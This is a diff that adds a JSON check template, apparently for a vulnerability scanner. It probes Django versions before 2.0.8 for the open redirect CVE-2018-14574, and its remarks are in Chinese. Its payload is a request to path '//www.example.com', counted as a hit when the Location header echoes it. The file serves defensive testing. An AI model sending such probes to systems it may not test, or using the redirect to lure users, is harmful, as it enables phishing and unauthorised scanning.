@@ -1,0 +1,23 @@
+{
+    "target":"django",
+    "meta":{
+        "name":    "Django < 2.0.8 任意URL跳转漏洞",
+        "remarks": "在path开头为//example.com的情况下，Django没做处理，导致浏览器认为目的地址是绝对路径，最终造成任意URL跳转漏洞。",
+        "level":   3,
+        "type":    "URLJUMP",
+        "author":   "wolf",
+        "references": {
+            "url":"https://github.com/vulhub/vulhub/blob/master/django/CVE-2018-14574/README.zh-cn.md",
+            "cve":"CVE-2018-14574",
+            "kpid":"KP-0055"
+        }
+    },
+    "request":{
+        "path":     "//www.example.com",
+        "postData": ""
+    },
+    "verify":{
+        "type":  "string",
+        "match": "Location: //www.example.com/"
+    }
+}
